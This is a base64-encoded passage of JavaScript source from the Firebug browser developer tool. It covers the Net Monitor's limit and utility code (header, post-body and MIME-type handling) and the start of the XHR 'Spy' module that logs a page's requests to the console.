ZDsNCiAgICB9LA0KDQogICAgb25QcmVmZXJlbmNlczogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICBvcGVuTmV3VGFiKCJhYm91dDpjb25maWciKTsNCiAgICB9LA0KDQogICAgdXBkYXRlQ291bnRlcjogZnVuY3Rpb24ocm93KQ0KICAgIHsNCiAgICAgICAgcmVtb3ZlQ2xhc3Mocm93LCAiY29sbGFwc2VkIik7DQoNCiAgICAgICAgLy8gVXBkYXRlIGluZm8gd2l0aGluIHRoZSBsaW1pdCByb3cuDQogICAgICAgIHZhciBsaW1pdExhYmVsID0gcm93LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldExpbWl0TGFiZWwiKS5pdGVtKDApOw0KICAgICAgICBsaW1pdExhYmVsLmZpcnN0Q2hpbGQubm9kZVZhbHVlID0gJFNUUlAoInBsdXJhbC5MaW1pdF9FeGNlZWRlZCIsIFtyb3cubGltaXRJbmZvLnRvdGFsQ291bnRdKTsNCiAgICB9LA0KDQogICAgY3JlYXRlVGFibGU6IGZ1bmN0aW9uKHBhcmVudCwgbGltaXRJbmZvKQ0KICAgIHsNCiAgICAgICAgdmFyIHRhYmxlID0gdGhpcy50YWJsZVRhZy5yZXBsYWNlKHt9LCBwYXJlbnQpOw0KICAgICAgICB2YXIgcm93ID0gdGhpcy5jcmVhdGVSb3codGFibGUuZmlyc3RDaGlsZC5maXJzdENoaWxkLCBsaW1pdEluZm8pOw0KICAgICAgICByZXR1cm4gW3RhYmxlLCByb3ddOw0KICAgIH0sDQoNCiAgICBjcmVhdGVSb3c6IGZ1bmN0aW9uKHBhcmVudCwgbGltaXRJbmZvKQ0KICAgIHsNCiAgICAgICAgdmFyIHJvdyA9IHRoaXMubGltaXRUYWcuaW5zZXJ0Um93cyhsaW1pdEluZm8sIHBhcmVudCwgdGhpcylbMF07DQogICAgICAgIHJvdy5saW1pdEluZm8gPSBsaW1pdEluZm87DQogICAgICAgIHJldHVybiByb3c7DQogICAgfSwNCg0KICAgIC8vIG5zSVByZWZPYnNlcnZlcg0KICAgIG9ic2VydmU6IGZ1bmN0aW9uKHN1YmplY3QsIHRvcGljLCBkYXRhKQ0KICAgIHsNCiAgICAgICAgLy8gV2UncmUgb2JzZXJ2aW5nIHByZWZlcmVuY2VzIG9ubHkuDQogICAgICAgIGlmICh0b3BpYyAhPSAibnNQcmVmOmNoYW5nZWQiKQ0KICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICBpZiAoZGF0YS5pbmRleE9mKCJuZXQubG9nTGltaXQiKSAhPSAtMSkNCiAgICAgICAgICAgIHRoaXMudXBkYXRlTWF4TGltaXQoKTsNCiAgICB9LA0KDQogICAgdXBkYXRlTWF4TGltaXQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciB2YWx1ZSA9IEZpcmVidWcuZ2V0UHJlZihGaXJlYnVnLnByZWZEb21haW4sICJuZXQubG9nTGltaXQiKTsNCiAgICAgICAgbWF4UXVldWVSZXF1ZXN0cyA9IHZhbHVlID8gdmFsdWUgOiBtYXhRdWV1ZVJlcXVlc3RzOw0KICAgIH0NCn0pOw0KDQp2YXIgTmV0TGltaXQgPSBGaXJlYnVnLk5ldE1vbml0b3IuTmV0TGltaXQ7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQpGaXJlYnVnLk5ldE1vbml0b3IuUmVzcG9uc2VTaXplTGltaXQgPSBkb21wbGF0ZShGaXJlYnVnLlJlcCwNCnsNCiAgICB0YWc6DQogICAgICAgIERJVih7ImNsYXNzIjogIm5ldEluZm9SZXNwb25zZVNpemVMaW1pdCJ9LA0KICAgICAgICAgICAgU1BBTigiJG9iamVjdC5iZWZvcmVMaW5rIiksDQogICAgICAgICAgICBBKHsiY2xhc3MiOiAib2JqZWN0TGluayIsIG9uY2xpY2s6ICIkb25DbGlja0xpbmsifSwNCiAgICAgICAgICAgICAgICAiJG9iamVjdC5saW5rVGV4dCINCiAgICAgICAgICAgICksDQogICAgICAgICAgICBTUEFOKCIkb2JqZWN0LmFmdGVyTGluayIpDQogICAgICAgICksDQoNCiAgICByZUxpbms6IC9eKC4qKTxhPiguKik8XC9hPiguKiQpLywNCiAgICBhcHBlbmQ6IGZ1bmN0aW9uKG9iaiwgcGFyZW50KQ0KICAgIHsNCiAgICAgICAgdmFyIG0gPSBvYmoudGV4dC5tYXRjaCh0aGlzLnJlTGluayk7DQogICAgICAgIHJldHVybiB0aGlzLnRhZy5hcHBlbmQoe29uQ2xpY2tMaW5rOiBvYmoub25DbGlja0xpbmssDQogICAgICAgICAgICBvYmplY3Q6IHsNCiAgICAgICAgICAgIGJlZm9yZUxpbms6IG1bMV0sDQogICAgICAgICAgICBsaW5rVGV4dDogbVsyXSwNCiAgICAgICAgICAgIGFmdGVyTGluazogbVszXQ0KICAgICAgICB9fSwgcGFyZW50LCB0aGlzKTsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KRmlyZWJ1Zy5OZXRNb25pdG9yLlV0aWxzID0NCnsNCiAgICBmaW5kSGVhZGVyOiBmdW5jdGlvbihoZWFkZXJzLCBuYW1lKQ0KICAgIHsNCiAgICAgICAgaWYgKCFoZWFkZXJzKQ0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQoNCiAgICAgICAgbmFtZSA9IG5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBoZWFkZXJzLmxlbmd0aDsgKytpKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGVhZGVyTmFtZSA9IGhlYWRlcnNbaV0ubmFtZS50b0xvd2VyQ2FzZSgpOw0KICAgICAgICAgICAgaWYgKGhlYWRlck5hbWUgPT0gbmFtZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gaGVhZGVyc1tpXS52YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBmb3JtYXRQb3N0VGV4dDogZnVuY3Rpb24odGV4dCkNCiAgICB7DQogICAgICAgIGlmICh0ZXh0IGluc3RhbmNlb2YgWE1MRG9jdW1lbnQpDQogICAgICAgICAgICByZXR1cm4gZ2V0RWxlbWVudFhNTCh0ZXh0LmRvY3VtZW50RWxlbWVudCk7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiB0ZXh0Ow0KICAgIH0sDQoNCiAgICBnZXRQb3N0VGV4dDogZnVuY3Rpb24oZmlsZSwgY29udGV4dCwgbm9MaW1pdCkNCiAgICB7DQogICAgICAgIGlmICghZmlsZS5wb3N0VGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgZmlsZS5wb3N0VGV4dCA9IHJlYWRQb3N0VGV4dEZyb21SZXF1ZXN0KGZpbGUucmVxdWVzdCwgY29udGV4dCk7DQoNCiAgICAgICAgICAgIGlmICghZmlsZS5wb3N0VGV4dCAmJiBjb250ZXh0KQ0KICAgICAgICAgICAgICAgIGZpbGUucG9zdFRleHQgPSByZWFkUG9zdFRleHRGcm9tUGFnZShmaWxlLmhyZWYsIGNvbnRleHQpOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCFmaWxlLnBvc3RUZXh0KQ0KICAgICAgICAgICAgcmV0dXJuIGZpbGUucG9zdFRleHQ7DQoNCiAgICAgICAgdmFyIGxpbWl0ID0gRmlyZWJ1Zy5uZXREaXNwbGF5ZWRQb3N0Qm9keUxpbWl0Ow0KICAgICAgICBpZiAoZmlsZS5wb3N0VGV4dC5sZW5ndGggPiBsaW1pdCAmJiAhbm9MaW1pdCkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIGNyb3BTdHJpbmcoZmlsZS5wb3N0VGV4dCwgbGltaXQsDQogICAgICAgICAgICAgICAgIlxuXG4uLi4gIiArICRTVFIoIm5ldC5wb3N0RGF0YVNpemVMaW1pdE1lc3NhZ2UiKSArICIgLi4uXG5cbiIpOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIGZpbGUucG9zdFRleHQ7DQogICAgfSwNCg0KICAgIGdldFJlc3BvbnNlVGV4dDogZnVuY3Rpb24oZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIC8vIFRoZSByZXNwb25zZSBjYW4gYmUgYWxzbyBlbXB0eSBzdHJpbmcgc28sIGNoZWNrIGFnYWlucyAidW5kZWZpbmVkIi4NCiAgICAgICAgcmV0dXJuICh0eXBlb2YoZmlsZS5yZXNwb25zZVRleHQpICE9ICJ1bmRlZmluZWQiKT8gZmlsZS5yZXNwb25zZVRleHQgOg0KICAgICAgICAgICAgY29udGV4dC5zb3VyY2VDYWNoZS5sb2FkVGV4dChmaWxlLmhyZWYsIGZpbGUubWV0aG9kLCBmaWxlKTsNCiAgICB9LA0KDQogICAgaXNVUkxFbmNvZGVkUmVxdWVzdDogZnVuY3Rpb24oZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB0ZXh0ID0gVXRpbHMuZ2V0UG9zdFRleHQoZmlsZSwgY29udGV4dCk7DQogICAgICAgIGlmICh0ZXh0ICYmIHRleHQudG9Mb3dlckNhc2UoKS5pbmRleE9mKCJjb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpID09IDApDQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCg0KICAgICAgICAvLyBUaGUgaGVhZGVyIHZhbHVlIGRvZXNuJ3QgaGF2ZSB0byBiZSBhbHdheXMgZXhhY3RseSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCiAgICAgICAgLy8gdGhlcmUgY2FuIGJlIGV2ZW4gY2hhcnNldCBzcGVjaWZpZWQuIFNvLCB1c2UgaW5kZXhPZiByYXRoZXIgdGhhbiBqdXN0ICI9PSIuDQogICAgICAgIHZhciBoZWFkZXJWYWx1ZSA9IFV0aWxzLmZpbmRIZWFkZXIoZmlsZS5yZXF1ZXN0SGVhZGVycywgImNvbnRlbnQtdHlwZSIpOw0KICAgICAgICBpZiAoaGVhZGVyVmFsdWUgJiYgaGVhZGVyVmFsdWUuaW5kZXhPZigiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIikgPT0gMCkNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KDQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KDQogICAgaXNNdWx0aVBhcnRSZXF1ZXN0OiBmdW5jdGlvbihmaWxlLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHRleHQgPSBVdGlscy5nZXRQb3N0VGV4dChmaWxlLCBjb250ZXh0KTsNCiAgICAgICAgaWYgKHRleHQgJiYgdGV4dC50b0xvd2VyQ2FzZSgpLmluZGV4T2YoImNvbnRlbnQtdHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YSIpID09IDApDQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQoNCiAgICBnZXRNaW1lVHlwZTogZnVuY3Rpb24obWltZVR5cGUsIHVyaSkNCiAgICB7DQogICAgICAgIGlmICghbWltZVR5cGUgfHwgIShtaW1lQ2F0ZWdvcnlNYXAuaGFzT3duUHJvcGVydHkobWltZVR5cGUpKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGV4dCA9IGdldEZpbGVFeHRlbnNpb24odXJpKTsNCiAgICAgICAgICAgIGlmICghZXh0KQ0KICAgICAgICAgICAgICAgIHJldHVybiBtaW1lVHlwZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgZXh0TWltZVR5cGUgPSBtaW1lRXh0ZW5zaW9uTWFwW2V4dC50b0xvd2VyQ2FzZSgpXTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZXh0TWltZVR5cGUgPyBleHRNaW1lVHlwZSA6IG1pbWVUeXBlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiBtaW1lVHlwZTsNCiAgICB9LA0KDQogICAgZ2V0RGF0ZUZyb21TZWNvbmRzOiBmdW5jdGlvbihzKQ0KICAgIHsNCiAgICAgICAgdmFyIGQgPSBuZXcgRGF0ZSgpOw0KICAgICAgICBkLnNldFRpbWUocyoxMDAwKTsNCiAgICAgICAgcmV0dXJuIGQ7DQogICAgfSwNCg0KICAgIGdldEh0dHBIZWFkZXJzOiBmdW5jdGlvbihyZXF1ZXN0LCBmaWxlKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBodHRwID0gUUkocmVxdWVzdCwgQ2kubnNJSHR0cENoYW5uZWwpOw0KICAgICAgICAgICAgZmlsZS5zdGF0dXMgPSByZXF1ZXN0LnJlc3BvbnNlU3RhdHVzOw0KDQogICAgICAgICAgICAvLyB4eHhIb256YTogaXMgdGhlcmUgYW55IHByb2JsZW0gdG8gZG8gdGhpcyBpbiByZXF1ZXN0ZWRGaWxlIG1ldGhvZD8NCiAgICAgICAgICAgIGZpbGUubWV0aG9kID0gaHR0cC5yZXF1ZXN0TWV0aG9kOw0KICAgICAgICAgICAgZmlsZS51cmxQYXJhbXMgPSBwYXJzZVVSTFBhcmFtcyhmaWxlLmhyZWYpOw0KICAgICAgICAgICAgZmlsZS5taW1lVHlwZSA9IFV0aWxzLmdldE1pbWVUeXBlKHJlcXVlc3QuY29udGVudFR5cGUsIHJlcXVlc3QubmFtZSk7DQoNCiAgICAgICAgICAgIGlmICghZmlsZS5yZXNwb25zZUhlYWRlcnMgJiYgRmlyZWJ1Zy5jb2xsZWN0SHR0cEhlYWRlcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3RIZWFkZXJzID0gW10sIHJlc3BvbnNlSGVhZGVycyA9IFtdOw0KDQogICAgICAgICAgICAgICAgaHR0cC52aXNpdFJlcXVlc3RIZWFkZXJzKHsNCiAgICAgICAgICAgICAgICAgICAgdmlzaXRIZWFkZXI6IGZ1bmN0aW9uKG5hbWUsIHZhbHVlKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0SGVhZGVycy5wdXNoKHtuYW1lOiBuYW1lLCB2YWx1ZTogdmFsdWV9KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIGh0dHAudmlzaXRSZXNwb25zZUhlYWRlcnMoew0KICAgICAgICAgICAgICAgICAgICB2aXNpdEhlYWRlcjogZnVuY3Rpb24obmFtZSwgdmFsdWUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlSGVhZGVycy5wdXNoKHtuYW1lOiBuYW1lLCB2YWx1ZTogdmFsdWV9KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KDQogICAgICAgICAgICAgICAgZmlsZS5yZXF1ZXN0SGVhZGVycyA9IHJlcXVlc3RIZWFkZXJzOw0KICAgICAgICAgICAgICAgIGZpbGUucmVzcG9uc2VIZWFkZXJzID0gcmVzcG9uc2VIZWFkZXJzOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChleGMpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIEFuIGV4Y2VwdGlvbiBjYW4gYmUgdGhyb3dlZCBlLmcuIHdoZW4gdGhlIHJlcXVlc3QgaXMgYWJvcnRlZCBhbmQNCiAgICAgICAgICAgIC8vIHJlcXVlc3QucmVzcG9uc2VTdGF0dXMgaXMgYWNjZXNzZWQuDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJuZXQuZ2V0SHR0cEhlYWRlcnMgRkFJTFMgIiArIGZpbGUuaHJlZiwgZXhjKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBpc1hIUjogZnVuY3Rpb24ocmVxdWVzdCkNCiAgICB7DQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY2FsbGJhY2tzID0gcmVxdWVzdC5ub3RpZmljYXRpb25DYWxsYmFja3M7DQogICAgICAgICAgICB2YXIgeGhyUmVxdWVzdCA9IGNhbGxiYWNrcyA/IGNhbGxiYWNrcy5nZXRJbnRlcmZhY2UoQ2kubnNJWE1MSHR0cFJlcXVlc3QpIDogbnVsbDsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19ORVQpDQogICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoIm5ldC5pc1hIUjsgIiArICh4aHJSZXF1ZXN0ICE9IG51bGwpICsgIiwgIiArIHNhZmVHZXROYW1lKHJlcXVlc3QpKTsNCg0KICAgICAgICAgICAgcmV0dXJuICh4aHJSZXF1ZXN0ICE9IG51bGwpOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChleGMpDQogICAgICAgIHsNCiAgICAgICAgfQ0KDQogICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQoNCiAgICBnZXRGaWxlQ2F0ZWdvcnk6IGZ1bmN0aW9uKGZpbGUpDQogICAgew0KICAgICAgICBpZiAoZmlsZS5jYXRlZ29yeSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX05FVCkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibmV0LmdldEZpbGVDYXRlZ29yeTsgY3VycmVudDogIiArIGZpbGUuY2F0ZWdvcnkgKyAiIGZvcjogIiArIGZpbGUuaHJlZiwgZmlsZSk7DQogICAgICAgICAgICByZXR1cm4gZmlsZS5jYXRlZ29yeTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChmaWxlLmlzWEhSKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfTkVUKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJuZXQuZ2V0RmlsZUNhdGVnb3J5OyBYSFIgZm9yOiAiICsgZmlsZS5ocmVmLCBmaWxlKTsNCiAgICAgICAgICAgIHJldHVybiBmaWxlLmNhdGVnb3J5ID0gInhociI7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoIWZpbGUubWltZVR5cGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBleHQgPSBnZXRGaWxlRXh0ZW5zaW9uKGZpbGUuaHJlZik7DQogICAgICAgICAgICBpZiAoZXh0KQ0KICAgICAgICAgICAgICAgIGZpbGUubWltZVR5cGUgPSBtaW1lRXh0ZW5zaW9uTWFwW2V4dC50b0xvd2VyQ2FzZSgpXTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8qaWYgKEZCVHJhY2UuREJHX05FVCkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJuZXQuZ2V0RmlsZUNhdGVnb3J5OyAiICsgbWltZUNhdGVnb3J5TWFwW2ZpbGUubWltZVR5cGVdICsNCiAgICAgICAgICAgICAgICAiLCBtaW1lVHlwZTogIiArIGZpbGUubWltZVR5cGUgKyAiIGZvcjogIiArIGZpbGUuaHJlZiwgZmlsZSk7Ki8NCg0KICAgICAgICBpZiAoIWZpbGUubWltZVR5cGUpDQogICAgICAgICAgICByZXR1cm4gIiI7DQoNCiAgICAgICAgLy8gU29sdmUgY2FzZXMgd2hlbiBjaGFyc2V0IGlzIGFsc28gc3BlY2lmaWVkLCBlZyAidGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ii4NCiAgICAgICAgdmFyIG1pbWVUeXBlID0gZmlsZS5taW1lVHlwZTsNCiAgICAgICAgaWYgKG1pbWVUeXBlKQ0KICAgICAgICAgICAgbWltZVR5cGUgPSBtaW1lVHlwZS5zcGxpdCgiOyIpWzBdOw0KDQogICAgICAgIHJldHVybiAoZmlsZS5jYXRlZ29yeSA9IG1pbWVDYXRlZ29yeU1hcFttaW1lVHlwZV0pOw0KICAgIH0NCn07DQoNCnZhciBVdGlscyA9IEZpcmVidWcuTmV0TW9uaXRvci5VdGlsczsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCi8vRmlyZWJ1Zy5yZWdpc3RlclJlcChGaXJlYnVnLk5ldE1vbml0b3IuTmV0UmVxdWVzdFRhYmxlKTsNCi8vRmlyZWJ1Zy5yZWdpc3RlckFjdGl2YWJsZU1vZHVsZShGaXJlYnVnLk5ldE1vbml0b3IpOw0KLy9GaXJlYnVnLnJlZ2lzdGVyUGFuZWwoTmV0UGFuZWwpOw0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuTmV0TW9uaXRvcik7DQovL0ZpcmVidWcucmVnaXN0ZXJSZXAoRmlyZWJ1Zy5OZXRNb25pdG9yLkJyZWFrcG9pbnRSZXApOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCn19KTsNCg0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyhmdW5jdGlvbigpIHsgd2l0aCAoRkJMKSB7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQ29uc3RhbnRzDQoNCi8vY29uc3QgQ2MgPSBDb21wb25lbnRzLmNsYXNzZXM7DQovL2NvbnN0IENpID0gQ29tcG9uZW50cy5pbnRlcmZhY2VzOw0KDQovLyBMaXN0IG9mIGNvbnRleHRzIHdpdGggWEhSIHNweSBhdHRhY2hlZC4NCnZhciBjb250ZXh0cyA9IFtdOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFNweSBNb2R1bGUNCg0KLyoqDQogKiBAbW9kdWxlIFJlcHJlc2VudHMgYSBYSFIgU3B5IG1vZHVsZS4gVGhlIG1haW4gcHVycG9zZSBvZiB0aGUgWEhSIFNweSBmZWF0dXJlIGlzIHRvIG1vbml0b3INCiAqIFhIUiBhY3Rpdml0eSBvZiB0aGUgY3VycmVudCBwYWdlIGFuZCBjcmVhdGUgYXBwcm9wcmlhdGUgbG9nIGludG8gdGhlIENvbnNvbGUgcGFuZWwuDQogKiBUaGlzIGZlYXR1cmUgY2FuIGJlIGNvbnRyb2xsZWQgYnkgYW4gb3B0aW9uIDxpPlNob3cgWE1MSHR0cFJlcXVlc3RzPC9pPiAoZnJvbSB3aXRoaW4gdGhlDQogKiBjb25zb2xlIHBhbmVsKS4NCiAqIA0KICogVGhlIG1vZHVsZSBpcyByZXNwb25zaWJsZSBmb3IgYXR0YWNoaW5nL2RldGFjaGluZyBhIEhUVFAgT2JzZXJ2ZXJzIHdoZW4gRmlyZWJ1ZyBpcw0KICogYWN0aXZhdGVkL2RlYWN0aXZhdGVkIGZvciBhIHNpdGUuDQogKi8NCkZpcmVidWcuU3B5ID0gZXh0ZW5kKEZpcmVidWcuTW9kdWxlLA0KLyoqIEBsZW5kcyBGaXJlYnVnLlNweSAqLw0Kew0KICAgIGRpc3BhdGNoTmFtZTogInNweSIsDQoNCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoRmlyZWJ1Zy5UcmFjZU1vZHVsZSkNCiAgICAgICAgICAgIEZpcmVidWcuVHJhY2VNb2R1bGUuYWRkTGlzdGVuZXIodGhpcy5UcmFjZUxpc3RlbmVyKTsNCg0KICAgICAgICBGaXJlYnVnLk1vZHVsZS5pbml0aWFsaXplLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgfSwNCg0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLk1vZHVsZS5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KDQogICAgICAgIGlmIChGaXJlYnVnLlRyYWNlTW9kdWxlKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5UcmFjZU1vZHVsZS5yZW1vdmVMaXN0ZW5lcih0aGlzLlRyYWNlTGlzdGVuZXIpOw0KICAgIH0sDQoNCiAgICBpbml0Q29udGV4dDogZnVuY3Rpb24oY29udGV4dCkNCiAgICB7DQogICAgICAgIGNvbnRleHQuc3BpZXMgPSBbXTsNCg0KICAgICAgICBpZiAoRmlyZWJ1Zy5zaG93WE1MSHR0cFJlcXVlc3RzICYmIEZpcmVidWcuQ29uc29sZS5pc0Fsd2F5c0VuYWJsZWQoKSkNCiAgICAgICAgICAgIHRoaXMuYXR0YWNoT2JzZXJ2ZXIoY29udGV4dCwgY29udGV4dC53aW5kb3cpOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19TUFkpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmluaXRDb250ZXh0ICIgKyBjb250ZXh0cy5sZW5ndGggKyAiICIsIGNvbnRleHQuZ2V0TmFtZSgpKTsNCiAgICB9LA0KDQogICAgZGVzdHJveUNvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICAvLyBGb3IgYW55IHNwaWVzIHRoYXQgYXJlIGluIHByb2dyZXNzLCByZW1vdmUgb3VyIGxpc3RlbmVycyBzbyB0aGF0IHRoZXkgZG9uJ3QgbGVhaw0KICAgICAgICB0aGlzLmRldGFjaE9ic2VydmVyKGNvbnRleHQsIG51bGwpOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19TUFkgJiYgY29udGV4dC5zcGllcy5sZW5ndGgpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmRlc3Ryb3lDb250ZXh0OyBFUlJPUiBUaGVyZSBhcmUgbGVha2luZyBTcGllcyAoIg0KICAgICAgICAgICAgICAgICsgY29udGV4dC5zcGllcy5sZW5ndGggKyAiKSAiICsgY29udGV4dC5nZXROYW1lKCkpOw0KDQogICAgICAgIGRlbGV0ZSBjb250ZXh0LnNwaWVzOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19TUFkpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic3B5LmRlc3Ryb3lDb250ZXh0ICIgKyBjb250ZXh0cy5sZW5ndGggKyAiICIsIGNvbnRleHQuZ2V0TmFtZSgpKTsNCiAgICB9LA0KDQogICAgd2F0Y2hXaW5kb3c6IGZ1bmN0aW9uKGNvbnRleHQsIHdpbikNCiAgICB7DQogICAgICAgIGlmIChGaXJlYnVnLnNob3dYTUxIdHRwUmVxdWVzdHMgJiYgRmlyZWJ1Zy5Db25zb2xlLmlzQWx3YXlzRW5hYmxlZCgpKQ0KICAgICAgICAgICAgdGhpcy5hdHRhY2hPYnNlcnZlcihjb250ZXh0LCB3aW4pOw0KICAgIH0sDQoNCiAgICB1bndhdGNoV2luZG93OiBmdW5jdGlvbihjb250ZXh0LCB3aW4pDQogICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVGhpcyBtYWtlIHN1cmUgdGhhdCB0aGUgZXhpc3RpbmcgY29udGV4dCBpcyBwcm9wZXJseSByZW1vdmVkIGZyb20gImNvbnRleHRzIiBhcnJheS4NCiAgICAgICAgICAgIHRoaXMuZGV0YWNoT2JzZXJ2ZXIoY29udGV4dCwgd2luKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoZXgpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIEdldCBleGNlcHRpb25zIGhlcmUgc29tZXRpbWVzLCBzbyBsZXQncyBqdXN0IGlnbm9yZSB0aGVtDQogICAgICAgICAgICAvLyBzaW5jZSB0aGUgd2luZG93IGlzIGdvaW5nIGF3YXkgYW55aG93DQogICAgICAgICAgICBFUlJPUihleCk7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgdXBkYXRlT3B0aW9uOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSkNCiAgICB7DQogICAgICAgIC8vIFhYWGpqYiBIb256YSwgaWYgQ29uc29sZS5pc0VuYWJsZWQoY29udGV4dCkgZmFsc2UsIHRoZW4gdGhpcyBjYW4ndCBiZSBjYWxsZWQsDQogICAgICAgIC8vIGJ1dCBzb21laG93IHNlZW1zIG5vdCBjb3JyZWN0DQogICAgICAgIGlmIChuYW1lID09ICJzaG93WE1MSHR0cFJlcXVlc3RzIikNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHRhY2ggPSB2YWx1ZSA/IHR